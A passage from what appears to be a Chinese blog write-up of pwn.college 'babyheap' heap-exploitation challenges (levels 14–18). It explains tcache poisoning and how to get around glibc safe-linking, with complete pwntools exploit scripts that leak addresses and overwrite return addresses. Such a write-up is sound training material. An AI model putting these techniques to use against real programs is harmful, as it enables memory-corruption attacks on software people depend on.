class="hljs-string">b&quot;quit&quot;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>可能会出错的原因前面提了，win_addr如果存在<code>0x09</code>和<code>0x0a</code>那么就改一下它的地址。canary如果出现这两个字节，那么就多执行几次。</p>
+<p>这里有更简单的办法，因为我们这里选择栈溢出的方式，所以写入的数据有点多，会导致这样的问题。当我们<code>echo</code>出程序基址后，紧接着构造<code>fake chunk</code>。然后malloc出来后，就能echo出很多东西了。包括<code>canary</code>，<code>stack_addr</code>等等。有了<code>stack_addr</code>那么就能直接算出<code>main_ret_addr</code>。</p>
+<p>那么再和前面的level 11一样，通过<code>scanf</code>写<code>next</code>，从而使得chunk的地址为ret_addr，然后写入win_addr就行了。</p>
+<h4 id="level14-1"><a href="#level14-1" class="headerlink" title="level14.1"></a>level14.1</h4><p>这里不能直接用<code>win_Addr</code>因为它的最低位为<code>0x09</code>是制表符，导致输入截断。改一下就好了。</p>
+<h4 id="level15-0"><a href="#level15-0" class="headerlink" title="level15.0"></a>level15.0</h4><p>现在没有<code>stack_xxx</code>相关的操作了。但是<code>echo</code>可以泄露出来程序基址和栈地址。但是有个问题，它的<code>free</code>会导致地址指针重置，也就是<code>free 0 </code>后会执行<code>allocations[0]=0</code>。那么之前我们通过<code>echo</code>泄露基地址和栈地址的方式就无法用了。</p>
+<blockquote>
+<p>在此前，我们会先malloc(32)，然后free掉。使得在执行echo的时候，其malloc的就是我们fastbin中的chunk，因此我们传入echo的参数和它申请的地址一致。所以<code>echo 0 0</code>就是<code>/bin/sh</code>的地址，减去偏移就是base_address的地址。<code>echo 0 8</code>就是存data的地址，也就是一个栈上的地址。</p>
+</blockquote>
+<p>相应的，因为申请chunk时地址的递增的，所以我们先申请一个32字节大小的chunk，然后在echo时它也会申请一个32字节大小的chunk，而两个chunk地址之间差<code>0x30</code>，所以我们可以通过<code>echo 0 48</code>来达到原先<code>echo 0 0</code>的效果。</p>
+<p>还有一个问题，由于我们无法获得fastbin中的chunk address。所以无法直接通过<code>read</code>来修改<code>next</code>。因此，依然需要连续的chunk来覆盖。可以先申请三个大小一致的chunk，然后free其中高地址的两个，最后通过read最低地址的chunk来覆盖到fastbin中的chunk。使得next能够指向<code>main_ret_address</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p = process(<span class="hljs-string">&quot;/challenge/babyheap_level15.0&quot;</span>)<br><br><span class="hljs-comment"># get program_base_address</span><br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/read/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;malloc 0 32&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/read/quit): &quot;</span>)<br><span class="hljs-comment"># why 48?</span><br><span class="hljs-comment"># the first bin address: 0x2c0, and the second bin of same size addr: 0x2f0</span><br><span class="hljs-comment"># 0x2f0 - 0x2c0 = 0x30</span><br>p.sendline(<span class="hljs-string">b&quot;echo 0 48&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;Data: &quot;</span>)<br>base_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>)) - <span class="hljs-number">0x33f8</span><br>win_addr = base_addr + <span class="hljs-number">0x1B0f</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;base_addr:&quot;</span>, <span class="hljs-built_in">hex</span>(base_addr))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;win_addr:&quot;</span>, <span class="hljs-built_in">hex</span>(win_addr))<br><br><span class="hljs-comment"># get stack_address</span><br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/read/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;echo 0 56&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;Data: &quot;</span>)<br>main_ret_adr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\x00&quot;</span>)) + <span class="hljs-number">0xe</span> + <span class="hljs-number">0x160</span> + <span class="hljs-number">0x8</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;main_ret_adr:&quot;</span>, <span class="hljs-built_in">hex</span>(main_ret_adr))<br><br><span class="hljs-comment"># read to overwrite &quot;next&quot;</span><br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/read/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;malloc 0 48&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/read/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;malloc 1 48&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/read/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;malloc 2 48&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/read/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;free 2&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/read/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;free 1&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/read/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;read 0 72&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x30</span> + p64(<span class="hljs-number">0x0</span>) + p64(<span class="hljs-number">0x41</span>) + p64(main_ret_adr))<br><br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/read/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;malloc 1 48&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/read/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;malloc 0 48&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/read/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;read 0 8&quot;</span>)<br>p.sendline(p64(win_addr))<br><br><span class="hljs-comment"># win()</span><br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/echo/read/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;quit&quot;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h4 id="level15-1"><a href="#level15-1" class="headerlink" title="level15.1"></a>level15.1</h4><p>改偏移即可。</p>
+<h4 id="level16-0"><a href="#level16-0" class="headerlink" title="level16.0"></a>level16.0</h4><p>这题没开PIE啊，可以直接拿到<code>secret</code>的地址。但是glibc 2.31版本变成了2.32版本，引入了<code>safe-linking</code>。</p>
+<blockquote>
+<p>safe-linking主要靠异或实现，主要依赖以下两个函数：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> PROTECT_PTR(pos, ptr)</span><br>((__typeof (ptr)) ((((<span class="hljs-type">size_t</span>) pos) &gt;&gt; <span class="hljs-number">12</span>) ^ ((<span class="hljs-type">size_t</span>) ptr)))<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span><br></code></pre></td></tr></table></figure>
+
+<p>这两个函数分别在free和malloc函数中被引用</p>
+</blockquote>
+<p>对于<code>malloc</code>来说：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span> *<br><span class="hljs-title function_">tcache_get</span> <span class="hljs-params">(<span class="hljs-type">size_t</span> tc_idx)</span><br>&#123;<br>  tcache_entry *e = tcache-&gt;entries[tc_idx];<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (!aligned_OK (e))) <span class="hljs-comment">//检查对齐</span><br>    malloc_printerr (<span class="hljs-string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);<br>  tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);<br>  --(tcache-&gt;counts[tc_idx]);<br>  e-&gt;key = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">void</span> *) e;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>对于<code>free</code>来说：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span><br><span class="hljs-title function_">tcache_put</span> <span class="hljs-params">(mchunkptr chunk, <span class="hljs-type">size_t</span> tc_idx)</span><br>&#123;<br>  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br><br>  e-&gt;key = tcache_key;<br><br>  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);<br>  tcache-&gt;entries[tc_idx] = e;<br>  ++(tcache-&gt;counts[tc_idx]);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p><code>next</code>字段将进行<code>next_addr &gt;&gt; 12 ^ next</code>，next的地址右移12位并和next地址的值进行异或。在safe-linking加持下，要想获得tcache中下一个堆块的实际地址，需要知道<code>pos</code>和<code>ptr</code>两个值,<strong>即当前堆块的mem地址，和当前堆块的mem地址的值，得知后异或即可</strong></p>
+<p>解题思路是：首先<code>malloc</code>再<code>free</code>然后通过<code>puts</code>泄露当前TCACHE BIN的next段，因为在free时，会将这个BIN的地址以及这个BIN地址中的值进行移位异或，但是第一次malloc时其值为0，因此是将当前BIN的地址<code>0xdc72c0</code>右移<code>12</code>位变成<code>0xdc7</code>。所以此时拿到的next就是堆的基地址。然后，我们需要根据secret的地址<code>0x437f30</code>计算出它如果在在BIN中时的<code>next</code>段的值。也就是逆向思维，通过和secret的地址移位异或计算出<code>next</code>字段的值，然后再把这个next字段的值写入到BIN中，再malloc出来，这样就将secret的值留存到TCACHE BIN中，因为堆空间会复用的关系，所以我们重新malloc一个相同大小的chunk，这样就能得到前面保留secret的chunk，对于next字段是不会清空的，因此可以拿到secret的前八字节。后八字节因为malloc的时候会将key置为0，所以不用管。</p>
+<blockquote>
+<p>注意，我们拿到的遗留的secret是经过两次移位异或的，第一次是和它本身的地址进行的异或，第二次是和heap的基地址进行异或的。</p>
+</blockquote>
+<p>最后的exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p = process(<span class="hljs-string">&quot;/challenge/babyheap_level16.0&quot;</span>)<br><br><span class="hljs-comment"># get heap_base_address</span><br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;malloc 0 32&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;free 0&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;puts 0&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;Data: &quot;</span>)<br>en_next_mem = u64(p.recvline().strip(<span class="hljs-string">b&quot;\n&quot;</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;en_next: &quot;</span>, <span class="hljs-built_in">hex</span>(en_next_mem))<br>heap_base_addr = en_next_mem &lt;&lt; <span class="hljs-number">12</span><br><br>next_mem_to_write = heap_base_addr &gt;&gt; <span class="hljs-number">12</span> ^ <span class="hljs-number">0x437f30</span><br><br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;malloc 0 32&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;malloc 1 32&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;free 0&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;free 1&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;scanf 1&quot;</span>)<br>p.sendline(p64(next_mem_to_write))<br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;malloc 1 32&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;malloc 0 32&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;malloc 2 32&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;free 2&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;puts 2&quot;</span>)<br><br>p.recvuntil(<span class="hljs-string">b&quot;Data: &quot;</span>)<br>en_secret = u64(p.recv(<span class="hljs-number">8</span>))<br>secret = heap_base_addr &gt;&gt; <span class="hljs-number">12</span> ^ en_secret<br>secret = <span class="hljs-number">0x437f30</span> &gt;&gt; <span class="hljs-number">12</span> ^ secret<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;secret:&quot;</span>, <span class="hljs-built_in">hex</span>(secret))<br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/send_flag/quit): &quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;send_flag&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;Secret: &quot;</span>)<br>p.sendline(p64(secret)+p8(<span class="hljs-number">0x0</span>)*<span class="hljs-number">8</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h4 id="level16-1"><a href="#level16-1" class="headerlink" title="level16.1"></a>level16.1</h4><p>改secret的地址即可。</p>
+<h4 id="level17-0"><a href="#level17-0" class="headerlink" title="level17.0"></a>level17.0</h4><p>由于开启了safe-linking，所以按照之前的思路：通过<code>malloc</code>出<code>ret_address</code>的地址，然后再<code>scanf</code>将<code>win</code>函数的地址写入，最后<code>quit</code>，这个思路行不通。首先第一点<code>ret_address</code>是无法进行<code>malloc</code>的，因为地址没对齐，结尾不为0。其次，<code>malloc</code>出<code>rbp</code>的地址，再覆盖<code>rbp</code>和<code>ret_address</code>也是行不通的，因为这种情况下，<code>chunk_size</code>会变成<code>canary</code>，而canary是一个极大的数，所以malloc会失败（因为malloc前会有一个<code>malloc_usable_size()</code>检测，不可能<code>malloc</code>出canary大小的chunk）。</p>
+<p>注意<code>[leak]</code>中栈的地址，它实际上是一个ptr，并且puts也会访问这个ptr中保存地址，以打印数据。</p>
+<p>那么，如果我们申请到<code>ptr[0]</code>的TCACHE BIN，然后再<code>scanf</code>这个chunk，修改其中的数据为<code>canary</code>的地址，那么相应的就是修改<code>ptr[0]</code>所保存的地址。请看：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; tele rsp+<span class="hljs-number">0</span>x30<br><span class="hljs-attribute">00</span>:<span class="hljs-number">0000</span>│-<span class="hljs-number">110</span> <span class="hljs-number">0</span>x7ffd62e302c0 —▸ <span class="hljs-number">0</span>x7ffd62e303c8 ◂— <span class="hljs-number">0</span>xcf40c6b6d8f04200<br><span class="hljs-attribute">01</span>:<span class="hljs-number">0008</span>│-<span class="hljs-number">108</span> <span class="hljs-number">0</span>x7ffd62e302c8 ◂— <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">02</span>:<span class="hljs-number">0010</span>│-<span class="hljs-number">100</span> <span class="hljs-number">0</span>x7ffd62e302d0 —▸ <span class="hljs-number">0</span>x5749ff0632f0 ◂— <span class="hljs-number">0</span>x7ff8167cf2a3<br><span class="hljs-attribute">03</span>:<span class="hljs-number">0018</span>│-<span class="hljs-number">0</span>f8 <span class="hljs-number">0</span>x7ffd62e302d8 —▸ <span class="hljs-number">0</span>x7ffd62e302c0 —▸ <span class="hljs-number">0</span>x7ffd62e303c8 ◂— <span class="hljs-number">0</span>xcf40c6b6d8f04200<br></code></pre></td></tr></table></figure>
+
+<p><code>0x7ffd62e302c0</code>是<code>&amp;ptr[0]</code>，什么都没做的情况下，它所存储的值应当为TCACHE BIN的值，也就是heap的地址，即<code>ptr[0]=&amp;heap</code>。但是，当我们通过修改BIN的<code>next</code>为<code>ptr[0]</code>并把它<code>malloc</code>出来，那么使得<code>ptr[3]</code>中保存着<code>ptr[0]</code>的地址，即<code>ptr[3]=&amp;ptr[0]</code>然后我们通过<code>scanf</code>向<code>ptr[0]</code>中写入数据<code>canary</code>的地址。这样就使得<code>ptr[0]=&amp;canary</code>，通过<code>puts(ptr[0])</code>时，即可将canary泄露出来。达成上述情形</p>
+<p>那么进一步想一下，既然可以形成利用<code>ptr[3]</code>写<code>ptr[0]</code>的情况，那么我们可以把这里的<code>&amp;canary</code>换成<code>&amp;ret</code>，然后直接<code>scanf 0</code>写入<code>win_Addr</code>。</p>
+<p>先通过写<code>next</code>使得<code>ptr[3]</code>指向<code>ptr[0]</code>，再通过<code>scanf</code>写<code>ptr[3]</code>中保存的地址<code>ptr[0]</code>，使得原<code>ptr[0]</code>由指向<code>heap</code>区变为指向<code>ret_addr</code>，然后通过scanf写<code>ptr[0]</code>中保存的地址<code>ret_addr</code>覆盖为<code>win_addr</code>。</p>
+<p>思路如上，exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = process(<span class="hljs-string">&quot;/challenge/babyheap_level17.0&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;[LEAK] The local stack address of your allocations is at: &quot;</span>)<br>alloc_stack = p.recv(<span class="hljs-number">14</span>)<br>alloc_stack = <span class="hljs-built_in">int</span>(alloc_stack, <span class="hljs-number">16</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;[LEAK] The address of main is at: &quot;</span>)<br>main_addr = p.recv(<span class="hljs-number">14</span>)<br>main_addr = <span class="hljs-built_in">int</span>(main_addr, <span class="hljs-number">16</span>)<br>ret_addr = alloc_stack + <span class="hljs-number">0x118</span><br>win_addr = main_addr - <span class="hljs-number">0x1b1b</span> + <span class="hljs-number">0x1a00</span><br><br><br><span class="hljs-comment"># get heap_base_address</span><br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/quit):&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;malloc 0 32&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/quit):&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;malloc 1 32&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/quit):&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;free 0&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/quit):&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;puts 0&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;Data: &quot;</span>)<br>en_next_mem = u64(p.recvline().strip(<span class="hljs-string">b&quot;\n&quot;</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;en_next: &quot;</span>, <span class="hljs-built_in">hex</span>(en_next_mem))<br>heap_base_addr = en_next_mem &lt;&lt; <span class="hljs-number">12</span><br><br><span class="hljs-comment"># overwrite ret</span><br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/quit):&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;free 1&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/quit):&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;scanf 1&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;Index: &quot;</span>)<br>p.sendline(p64(alloc_stack ^ (heap_base_addr &gt;&gt; <span class="hljs-number">12</span>)))<br><br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/quit):&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;malloc 2 32&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/quit):&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;malloc 3 32&quot;</span>)                                  <span class="hljs-comment"># ptr[3]现在保存着&amp;ptr[0], 此时ptr[0]为chunk在heap的地址</span><br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/quit):&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;scanf 3&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;Index: &quot;</span>)<br>p.sendline(p64(ret_addr))                                   <span class="hljs-comment"># 修改ptr[0]的值为ret_addr</span><br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/quit):&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;scanf 0&quot;</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;Index: &quot;</span>)<br>p.sendline(p64(win_addr))                                   <span class="hljs-comment"># 修改ret_addr为win_addr</span><br>p.recvuntil(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/quit):&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;quit&quot;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+<h4 id="level17-1"><a href="#level17-1" class="headerlink" title="level17.1"></a>level17.1</h4><p>改偏移</p>
+<h4 id="level18-0"><a href="#level18-0" class="headerlink" title="level18.0"></a>level18.0</h4><p>exp不用改，还是level13.0的exp。safe-linking不影响我们在栈上构造fake chunk。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>p = process(<span class="hljs-string">&quot;/challenge/babyheap_level18.0&quot;</span>)<br><br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;stack_scanf&quot;</span>)<br>p.sendline(<span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">48</span>+ p64(<span class="hljs-number">0x101</span>) + p64(<span class="hljs-number">0x101</span>))<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;stack_free&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;malloc 0 248&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/send_flag/quit): &quot;</span>, <span class="hljs-string">b&quot;scanf 0&quot;</span>)<br>p.sendlineafter(<span class="hljs-string">b&quot;Index: &quot;</span>, <span 